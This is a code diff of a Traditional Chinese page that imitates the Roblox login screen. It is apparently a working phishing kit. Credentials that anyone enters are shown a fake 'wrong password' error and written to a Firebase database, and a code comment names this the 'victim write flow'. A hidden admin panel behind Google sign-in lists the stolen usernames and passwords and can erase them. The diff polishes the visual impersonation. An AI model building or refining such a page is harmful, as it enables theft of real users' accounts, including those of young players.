@@ -5,176 +5,166 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>登入 Roblox</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');
-        
         body { 
             background-color: #111214; 
             overflow-x: hidden; 
             overflow-y: auto; 
-            /* 使用類似 Roblox 官方的字體 */
-            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
             color: #ffffff;
+            margin: 0;
+            padding: 0;
         }
-        /* 背景傾斜網格 */
+
+        /* 傾斜的遊戲縮圖網格 */
         .bg-grid-wrapper { 
             position: fixed; 
             top: -50%; 
             left: -50%; 
             width: 200%; 
             height: 200%; 
-            transform: rotate(-15deg); 
+            transform: rotate(-12deg); 
             z-index: -2; 
             pointer-events: none; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         .bg-grid { 
             display: grid; 
-            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); 
+            grid-template-columns: repeat(14, 220px); 
             gap: 16px; 
-            width: 100%; 
-            height: 100%; 
-            opacity: 0.35; /* 降低透明度以符合截圖的暗黑感 */
         }
         .tile { 
-            width: 100%; 
-            aspect-ratio: 1; 
+            width: 220px; 
+            height: 220px; 
             background-size: cover; 
             background-position: center; 
             border-radius: 8px; 
-            box-shadow: 0 4px 20px rgba(0,0,0,0.9); 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.6);
+            background-color: #232527;
+            opacity: 0; 
+            transition: opacity 0.5s ease-in-out;
         }
         
-        /* 移除瀏覽器預設的輸入框高光 */
-        input:focus { outline: none; border-color: #ffffff; background-color: #111214; }
-        input::placeholder { color: #888c90; font-weight: 400; font-size: 14px; }
+        /* 深色淡化遮罩 */
+        .bg-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: rgba(17, 18, 20, 0.85); 
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        input { color: #ffffff !important; }
+        input:focus { outline: none; }
+        input::placeholder { color: #ffffff !important; opacity: 1 !important; font-weight: 500; }
         
-        /* 滾動條美化 */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #111214; }
-        ::-webkit-scrollbar-thumb { background: #393b3d; border-radius: 4px; }
+        .transition-roblox { transition: all 0.2s ease-in-out; }
     </style>
 </head>
 <body class="flex flex-col min-h-screen relative">
 
-    <!-- 背景圖層 -->
+    <!-- 遊戲縮圖背景圖層 -->
     <div class="bg-grid-wrapper" aria-hidden="true"><div class="bg-grid" id="bg-grid"></div></div>
-    <!-- 黑色半透明遮罩，還原官方背景的暗度 -->
-    <div class="fixed inset-0 bg-black/60 z-[-1] pointer-events-none"></div>
+    <div class="bg-overlay"></div>
 
     <!-- 頂部導覽列 -->
-    <nav class="w-full h-[56px] bg-[#111214]/95 border-b border-[#232527] flex items-center justify-between px-4 sm:px-6 z-50 fixed top-0 backdrop-blur-sm">
-        <div class="flex items-center gap-6">
-            <!-- Roblox Logo -->
-            <a href="#" id="logo" class="text-white hover:text-gray-300 transition-colors">
-                <svg viewBox="0 0 24 24" fill="currentColor" class="w-8 h-8">
-                    <path fill-rule="evenodd" clip-rule="evenodd" d="M5.275 2.5L2.5 18.725L18.725 21.5L21.5 5.275L5.275 2.5ZM13.842 13.626L10.373 14.22L9.779 10.751L13.248 10.158L13.842 13.626Z" />
+    <nav class="w-full h-[56px] bg-[#111214] flex items-center px-[20px] z-50 fixed top-0 select-none border-b border-[#232527]">
+        <div class="flex items-center gap-[24px]">
+            <!-- ★ 最後一塊拼圖：100% 完美的官方 Roblox Logo，移除變形，完美置中 -->
+            <a href="#" class="text-white flex items-center justify-center" aria-label="Roblox">
+                <svg viewBox="0 0 100 100" fill="currentColor" class="w-[30px] h-[30px]">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M21.6 5.4 L5.4 78.3 L78.3 94.5 L94.5 21.6 L21.6 5.4 Z M56.3 65.1 L37.1 60.8 L41.4 41.6 L60.6 45.9 L56.3 65.1 Z" />
                 </svg>
             </a>
-            <!-- 連結 -->
-            <div class="hidden md:flex items-center gap-6 text-[15px] font-bold text-gray-200">
-                <a href="#" class="hover:text-white transition-colors">圖表</a>
-                <a href="#" class="hover:text-white transition-colors">市集</a>
-                <a href="#" class="hover:text-white transition-colors">創作</a>
-                <a href="#" class="hover:text-white transition-colors">Robux</a>
+            <div class="hidden md:flex items-center gap-[28px] text-[15px] font-bold text-gray-200 mt-[2px]">
+                <a href="#" class="hover:text-white transition-roblox">圖表</a>
+                <a href="#" class="hover:text-white transition-roblox">市集</a>
+                <a href="#" class="hover:text-white transition-roblox">創作</a>
+                <a href="#" class="hover:text-white transition-roblox">Robux</a>
             </div>
         </div>
         
-        <!-- 搜尋列 -->
-        <div class="flex-1 max-w-[600px] mx-6 hidden md:flex justify-start">
-            <div class="relative flex items-center w-[400px] h-[36px] rounded-lg bg-[#232527] border border-[#232527] hover:border-gray-500 focus-within:border-white transition-colors overflow-hidden">
-                <div class="pl-3 pr-2 text-gray-400">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-5 h-5">
+        <div class="flex-1 hidden md:flex justify-center items-center ml-8">
+            <div class="relative flex items-center w-full max-w-[700px] h-[36px] rounded-[6px] bg-[#232527] border border-transparent focus-within:border-gray-400 transition-roblox overflow-hidden">
+                <div class="pl-[12px] pr-[8px] text-gray-400">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5" stroke="currentColor" class="w-[16px] h-[16px]">
                       <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
                     </svg>
                 </div>
-                <input type="text" placeholder="搜尋" class="bg-transparent w-full h-full pr-4 outline-none text-[15px] text-white placeholder-gray-400">
+                <input type="text" placeholder="搜尋" class="bg-transparent w-full h-full pr-3 outline-none text-[15px] text-white placeholder-gray-400 font-medium pb-[1px]">
             </div>
         </div>
 
-        <!-- 註冊按鈕 -->
-        <div class="flex items-center">
-            <button id="reg-btn" class="bg-[#3b82f6] hover:bg-[#2563eb] text-white px-[14px] py-[6px] rounded-[6px] text-[15px] font-bold transition-colors">
+        <div class="flex items-center ml-auto">
+            <!-- 鎖死按鈕大小，字體放大 -->
+            <button class="bg-[#0055FF] hover:bg-[#004ade] text-white w-[76px] h-[36px] flex items-center justify-center rounded-[8px] text-[18px] font-bold transition-roblox tracking-wide">
                 註冊
             </button>
         </div>
     </nav>
 
-    <!-- 主要內容區 (自適應垂直置中) -->
-    <main class="flex-1 flex items-center justify-center p-4 relative z-10 mt-[56px] py-10 min-h-[calc(100vh-56px)]">
+    <!-- 主體內容 -->
+    <main class="flex-1 flex items-center justify-center p-4 relative z-10 mt-[56px] py-12">
         
-        <!-- 登入視窗 -->
-        <div id="login-window" class="bg-[#2b2d31] w-full max-w-[420px] rounded-xl p-8 shadow-[0_0_40px_rgba(0,0,0,0.5)] flex flex-col items-center my-auto">
-            <h1 class="text-[28px] font-bold mb-6 text-white tracking-wide">登入 Roblox</h1>
+        <div id="login-window" class="bg-[#2b2d31] w-full max-w-[380px] rounded-none px-7 py-8 shadow-2xl flex flex-col items-center">
             
-            <div class="w-full flex flex-col gap-[14px]">
-                <!-- 帳號輸入框 -->
+            <h1 class="text-[36px] font-bold mb-6 text-white tracking-wide">登入 Roblox</h1>
+            
+            <div class="w-full flex flex-col gap-4">
                 <input type="text" id="username" placeholder="使用者名稱 / 電子郵件地址 / 手機號碼" 
-                       class="w-full h-[42px] bg-[#111214] border border-[#66686b] rounded-[6px] px-3 text-[15px] transition-colors">
+                       class="w-full h-[52px] bg-[#111214] border border-[#66686b] focus:border-white rounded-[4px] px-4 text-[17px] transition-roblox">
                 
-                <!-- 密碼輸入框 -->
                 <input type="password" id="password" placeholder="密碼" 
-                       class="w-full h-[42px] bg-[#111214] border border-[#66686b] rounded-[6px] px-3 text-[15px] transition-colors">
+                       class="w-full h-[52px] bg-[#111214] border border-[#66686b] focus:border-white rounded-[4px] px-4 text-[17px] transition-roblox">
                 
-                <!-- 錯誤與提示訊息 -->
-                <div id="error-message" class="hidden text-red-400 text-[13px] text-center w-full bg-red-500/10 border border-red-500/30 rounded py-2">
-                    使用者名稱或密碼不正確。
-                </div>
-                <div id="google-auth-msg" class="hidden text-blue-400 text-[13px] text-center w-full bg-blue-500/10 border border-blue-500/30 rounded py-2">
-                    正在呼叫 Google 驗證...
-                </div>
+                <div id="status-msg" class="hidden text-[14px] text-center w-full py-1 font-medium"></div>
                 
-                <!-- 登入按鈕 (完全還原透明白邊框樣式) -->
-                <button id="login-btn" class="w-full h-[42px] border border-white bg-transparent hover:bg-white/10 text-white rounded-[6px] text-[15px] font-medium transition-all mt-1">
+                <button id="login-btn" class="w-full h-[52px] border-[1.5px] border-white bg-transparent hover:bg-white/10 text-white rounded-[4px] text-[17px] font-bold transition-roblox mt-1">
                     登入
                 </button>
             </div>
 
-            <!-- 忘記密碼 -->
-            <a href="#" class="mt-5 text-[13px] text-gray-400 hover:text-white hover:underline transition-colors">忘記密碼或使用者名稱？</a>
+            <a href="#" class="mt-6 text-[16px] text-white hover:underline transition-roblox">忘記密碼或使用者名稱？</a>
             
-            <!-- 下方次要按鈕 -->
-            <div class="w-full flex flex-col gap-[10px] mt-6">
-                <button class="nav-link w-full h-[42px] bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-[6px] text-[15px] transition-colors">
+            <hr class="w-full border-t border-white my-6">
+
+            <div class="w-full flex flex-col gap-3">
+                <button class="w-full h-[52px] bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-[4px] text-[17px] font-bold transition-roblox">
                     透過電子郵件給我一次性驗證碼
                 </button>
-                <button class="nav-link w-full h-[42px] bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-[6px] text-[15px] transition-colors">
+                <button class="w-full h-[52px] bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-[4px] text-[17px] font-bold transition-roblox">
                     快速登入
                 </button>
             </div>
 
-            <div class="mt-6 text-[14px] text-gray-400">沒有帳號？ <a href="#" class="text-white hover:underline">註冊</a></div>
+            <div class="mt-7 text-[16px] text-gray-400">沒有帳號？ <a href="#" class="text-white hover:underline font-medium">註冊</a></div>
         </div>
 
-        <!-- 管理員面板 (與之前邏輯相同，僅微調配色) -->
-        <div id="admin-panel" class="hidden bg-[#2b2d31] w-full max-w-[650px] rounded-xl p-6 sm:p-8 shadow-2xl flex-col items-center my-auto border border-gray-700">
-            <h1 class="text-[24px] sm:text-[26px] font-bold text-red-400 mb-1">系統安全日誌</h1>
-            <p id="admin-welcome" class="text-green-400 text-[13px] mb-4 text-center break-all">已授權管理員</p>
-            <div class="w-full bg-[#111214] rounded-lg p-0 max-h-[350px] overflow-y-auto border border-gray-700 mt-2">
-                <table class="w-full text-left text-sm text-gray-300" style="table-layout: fixed;">
+        <!-- 管理員日誌面板 -->
+        <div id="admin-panel" class="hidden bg-[#2b2d31] w-full max-w-[650px] rounded-none p-10 shadow-2xl flex-col items-center border border-gray-700">
+            <h1 class="text-[28px] font-bold text-white mb-2">系統安全日誌</h1>
+            <p id="admin-welcome" class="text-green-400 text-[15px] mb-6 text-center">已驗證管理員</p>
+            <div class="w-full bg-[#111214] rounded-[4px] p-0 max-h-[350px] overflow-y-auto border border-[#393b3d] mt-2">
+                <table class="w-full text-left text-[15px] text-gray-300" style="table-layout: fixed;">
                     <thead class="sticky top-0 bg-[#232527] shadow-md z-10">
                         <tr>
-                            <th class="py-3 px-4 border-b border-gray-700 w-[28%] font-medium">時間</th>
-                            <th class="py-3 px-4 border-b border-gray-700 w-[36%] font-medium">帳號/信箱</th>
-                            <th class="py-3 px-4 border-b border-gray-700 w-[36%] font-medium">密碼</th>
+                            <th class="py-3 px-4 border-b border-[#393b3d] w-[28%] font-medium text-[15px]">時間</th>
+                            <th class="py-3 px-4 border-b border-[#393b3d] w-[36%] font-medium text-[15px]">帳號</th>
+                            <th class="py-3 px-4 border-b border-[#393b3d] w-[36%] font-medium text-[15px]">密碼</th>
                         </tr>
                     </thead>
-                    <tbody id="admin-records" class="divide-y divide-gray-800"></tbody>
+                    <tbody id="admin-records" class="divide-y divide-[#393b3d]"></tbody>
                 </table>
             </div>
-            <div class="flex flex-col sm:flex-row gap-4 mt-6 w-full">
-                <button id="clear-records-btn" class="flex-1 bg-red-600/20 text-red-500 border border-red-500 hover:bg-red-600 hover:text-white py-[10px] rounded-lg font-bold transition-colors">清除所有日誌</button>
-                <button id="close-admin-btn" class="flex-1 bg-gray-600 hover:bg-gray-500 text-white py-[10px] rounded-lg font-bold transition-colors">登出並返回</button>
+            <div class="flex gap-4 mt-8 w-full">
+                <button id="clear-records-btn" class="flex-1 h-[52px] bg-red-600 hover:bg-red-700 text-white rounded-[4px] text-[17px] font-bold transition-roblox">清除日誌</button>
+                <button id="close-admin-btn" class="flex-1 h-[52px] bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-[4px] text-[17px] font-bold transition-roblox">登出返回</button>
             </div>
         </div>
 
-        <!-- 自訂錯誤/提示彈窗 -->
-        <div id="error-404-modal" class="hidden fixed inset-0 bg-black/80 z-[100] flex items-center justify-center p-4 backdrop-blur-sm">
-            <div class="bg-[#2b2d31] w-full max-w-[320px] rounded-xl p-6 text-center border border-gray-700 shadow-2xl">
-                <h2 class="text-[20px] font-bold mb-3 text-white" id="modal-title">提示訊息</h2>
-                <p id="modal-error-text" class="text-gray-300 text-[14px] mb-6 break-words leading-relaxed">頁面或功能不存在。</p>
-                <button id="close-404-btn" class="bg-blue-600 hover:bg-blue-500 text-white w-full py-[10px] rounded-lg font-medium transition-colors">我知道了</button>
-            </div>
-        </div>
     </main>
 
     <script type="module">
@@ -213,20 +203,7 @@
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('login-btn');
-        const errorMessage = document.getElementById('error-message');
-        const googleAuthMsg = document.getElementById('google-auth-msg');
-
-        // 登入按鈕互動效果
-        function updateBtn() {
-            if(usernameInput.value && passwordInput.value) {
-                // 當有輸入文字時，按鈕可以稍微變亮以提示可點擊
-                loginBtn.classList.add('bg-white/10');
-            } else {
-                loginBtn.classList.remove('bg-white/10');
-            }
-        }
-        usernameInput.oninput = updateBtn;
-        passwordInput.oninput = updateBtn;
+        const statusMsg = document.getElementById('status-msg');
 
         function escapeHTML(str) {
             const div = document.createElement('div');
@@ -234,59 +211,72 @@
             return div.innerHTML;
         }
 
-        function showErrorModal(text, title = "提示訊息") {
-            document.getElementById('modal-title').innerText = title;
-            document.getElementById('modal-error-text').innerText = text;
-            document.getElementById('error-404-modal').classList.remove('hidden');
+        function showStatus(text, isError = true) {
+            statusMsg.innerText = text;
+            statusMsg.classList.remove('hidden');
+            if (isError) {
+                statusMsg.className = "text-[#f24e43] text-[14px] text-center w-full py-1 font-bold";
+                usernameInput.classList.add('border-[#f24e43]');
+                passwordInput.classList.add('border-[#f24e43]');
+            } else {
+                statusMsg.className = "text-blue-400 text-[14px] text-center w-full py-1 font-bold";
+                usernameInput.classList.remove('border-[#f24e43]');
+                passwordInput.classList.remove('border-[#f24e43]');
+            }
         }
+
+        function clearStatus() {
+            statusMsg.classList.add('hidden');
+            usernameInput.classList.remove('border-[#f24e43]');
+            passwordInput.classList.remove('border-[#f24e43]');
+        }
+
+        usernameInput.oninput = clearStatus;
+        passwordInput.oninput = clearStatus;
 
         loginBtn.onclick = async () => {
             const u = usernameInput.value;
             const p = passwordInput.value;
-            if(!u || !p) return;
+            if(!u || !p) {
+                showStatus("請輸入使用者名稱和密碼。");
+                return;
+            }
 
             if(u === 'admin' && p === 'admin') {
-                errorMessage.classList.add('hidden');
-                googleAuthMsg.classList.remove('hidden');
+                showStatus("正在呼叫安全驗證...", false);
                 loginBtn.disabled = true;
-                loginBtn.innerHTML = "驗證中...";
+                loginBtn.style.opacity = "0.5";
 
                 try {
                     const result = await signInWithPopup(auth, provider);
                     const email = result.user.email;
 
                     if (ALLOWED_EMAILS.includes(email)) {
-                        document.getElementById('admin-welcome').innerText = `管理員已登入: ${email}`;
+                        document.getElementById('admin-welcome').innerText = `登入身分: ${email}`;
                         document.getElementById('login-window').classList.add('hidden');
                         document.getElementById('admin-panel').classList.remove('hidden');
                         document.getElementById('admin-panel').classList.add('flex');
-                        
+                        clearStatus();
                         listenToData();
                     } else {
                         await signOut(auth);
-                        showErrorModal(`您的信箱 ${email} 不在授權名單內。`, "權限不足");
+                        showStatus("拒絕存取：此 Google 帳號無權限。");
                         signInAnonymously(auth); 
                     }
                 } catch (error) {
-                    console.error("Google Auth Error", error);
-                    let errText = "發生錯誤。";
-                    if (error.code === 'auth/popup-blocked') errText = "彈出視窗被瀏覽器阻擋，請允許彈窗。";
-                    else if (error.code === 'auth/popup-closed-by-user') errText = "您取消了登入操作。";
-                    else if (error.code === 'auth/unauthorized-domain') errText = "請至 Firebase 控制台授權此網域。";
-                    else errText = `無法登入：${error.message}`;
-                    showErrorModal(errText, "登入失敗");
+                    if (error.code === 'auth/popup-blocked') {
+                        showStatus("登入彈窗被瀏覽器阻擋。");
+                    } else {
+                        showStatus("驗證已取消或發生錯誤。");
+                    }
                 } finally {
-                    googleAuthMsg.classList.add('hidden');
                     loginBtn.disabled = false;
-                    loginBtn.innerHTML = "登入";
+                    loginBtn.style.opacity = "1";
                     passwordInput.value = '';
-                    updateBtn();
                 }
             } else {
-                // 受害者寫入流程
-                errorMessage.classList.remove('hidden');
+                showStatus("使用者名稱或密碼不正確。");
                 passwordInput.value = '';
-                updateBtn();
                 
                 try {
                     const pathSegments = collectionPath.split('/');
@@ -307,21 +297,21 @@
                 logs = snap.docs.map(d => ({id: d.id, ...d.data()})).sort((a,b) => b.ts - a.ts);
                 renderTable();
             }, error => {
-                showErrorModal("無法獲取資料，請檢查 Firebase 安全規則 (Rules)。", "存取被拒");
+                alert("無法讀取資料庫，請檢查 Firebase 設定！");
             });
         }
 
         function renderTable() {
             const body = document.getElementById('admin-records');
             if (logs.length === 0) {
-                body.innerHTML = '<tr><td colspan="3" class="text-center py-8 text-gray-500">雲端資料庫目前為空</td></tr>';
+                body.innerHTML = '<tr><td colspan="3" class="text-center py-8 text-gray-500 text-[15px]">無紀錄</td></tr>';
                 return;
             }
             body.innerHTML = logs.map(l => `
-                <tr class="hover:bg-[#1a1c1e] transition-colors">
-                    <td class="py-3 px-4 text-gray-400 text-[13px] pr-2">${escapeHTML(l.time || '')}</td>
-                    <td class="py-3 px-4 text-blue-400 font-medium break-all pr-2">${escapeHTML(l.u || '')}</td>
-                    <td class="py-3 px-4 text-red-400 font-medium break-all">${escapeHTML(l.p || '')}</td>
+                <tr class="hover:bg-[#1a1c1e]">
+                    <td class="py-3 px-4 text-gray-400 text-[14px] truncate">${escapeHTML(l.time || '')}</td>
+                    <td class="py-3 px-4 text-blue-400 font-bold text-[15px] break-all">${escapeHTML(l.u || '')}</td>
+                    <td class="py-3 px-4 text-red-400 font-bold text-[15px] break-all">${escapeHTML(l.p || '')}</td>
                 </tr>
             `).join('');
         }
@@ -330,49 +320,47 @@
             if(unsubscribeSnapshot) unsubscribeSnapshot();
             await signOut(auth);
             signInAnonymously(auth);
-
             document.getElementById('admin-panel').classList.add('hidden');
             document.getElementById('admin-panel').classList.remove('flex');
             document.getElementById('login-window').classList.remove('hidden');
             usernameInput.value = '';
             passwordInput.value = '';
-            errorMessage.classList.add('hidden');
-            updateBtn();
+            clearStatus();
         };
 
         document.getElementById('clear-records-btn').onclick = async () => {
-            if(!confirm("確定要刪除所有日誌嗎？此動作將從雲端永久抹除。")) return;
+            if(!confirm("確定要刪除所有紀錄嗎？")) return;
             const pathSegments = collectionPath.split('/');
             const ref = collection(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4]);
             try {
                 const snap = await getDocs(ref);
                 snap.forEach(async d => await deleteDoc(doc(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4], d.id)));
             } catch (error) {
-                showErrorModal("刪除失敗，權限不足。", "錯誤");
+                alert("刪除失敗");
             }
         };
 
-        document.getElementById('close-404-btn').onclick = () => {
-            document.getElementById('error-404-modal').classList.add('hidden');
-        };
-
-        document.querySelectorAll('a, button').forEach(el => {
-            if(!['login-btn','clear-records-btn','close-admin-btn','close-404-btn'].includes(el.id)) {
-                el.onclick = (e) => { 
-                    e.preventDefault(); 
-                    showErrorModal("Roblox 官方功能跳轉已停用。", "提示"); 
-                };
-            }
-        });
-
-        // 模擬背景牆 (使用遊戲相關圖片的隨機佔位符，營造與截圖相同的氛圍)
+        /* 生成真實的遊戲縮圖背景 */
         const grid = document.getElementById('bg-grid');
-        const searchTerms = ['gaming', '3d', 'abstract', 'neon', 'dark', 'cyberpunk'];
-        for(let i=0; i<80; i++) {
+        const gameIds = Array.from({length: 100}, (_, i) => i + 10); 
+        
+        for(let i = 0; i < 140; i++) {
             const d = document.createElement('div');
             d.className = 'tile';
-            // 使用隨機高品質圖片模擬遊戲封面
-            d.style.backgroundImage = `url(https://picsum.photos/seed/${i * 13 + 42}/300/300)`;
+            const randomId = gameIds[Math.floor(Math.random() * gameIds.length)];
+            const imgUrl = `https://www.freetogame.com/g/${randomId}/thumbnail.jpg`;
+            
+            const img = new Image();
+            img.src = imgUrl;
+            img.onload = () => { 
+                d.style.backgroundImage = `url('${imgUrl}')`;
+                d.style.opacity = '1';
+            };
+            img.onerror = () => {
+                d.style.backgroundColor = '#232527';
+                d.style.opacity = '1';
+            };
+            
             grid.appendChild(d);
         }
     </script>
